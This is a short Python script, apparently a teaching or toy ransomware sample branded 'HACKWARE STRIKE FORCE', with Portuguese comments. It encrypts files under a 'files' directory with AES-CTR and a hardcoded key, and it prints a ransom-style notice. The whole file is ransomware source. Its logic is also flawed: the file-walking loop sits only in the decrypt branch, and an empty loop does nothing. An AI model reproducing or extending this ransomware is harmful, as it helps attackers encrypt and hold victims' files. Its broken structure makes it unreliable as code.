#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import FileWalker
import Crypter

#-------------
# A Senha pode ter os seguintes tamanhos:
# 128/192/256 bits - 8 bits = 1 byte = 1 letra unicode
#-------------

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser=argparse.ArgumentParser()
    parser.add_argument(
        '-d',
         '--decrypt', 
        help='Desencripta os arquivos [default:no]',
        action='store_true'
    )
    return parser

#Logica Principal
def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    is_decrypt = args ['decrypt']

    if is_decrypt:
        print('''
        HACKWARE STRIKE FORCE
        --------------------------------------------
        Seus arquivos foram criptografados.
        Para decriptá-los utilize a seguinte senha'{}'
        '''.format(HARDCODED_KEY))
        key= input('Digite a senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY


    #Gera a Cifra de cripto
    ctr = Counter.new(128)
    crypto = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not is_decrypt:
        cryptoFn = crypto.encrypt

    else:
        cryptoFn = crypto.decrypt

        #Caminho inicial do walker
        start_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [start_path] #Pode especificar mais diretórios

        for currentDir in startDirs:
            for filename in FileWalker.walker(currentDir):
                Crypter.write_to_file(filename, cryptoFn)

        for _ in range (100):
            pass

if __name__ == '__main__':
    main()


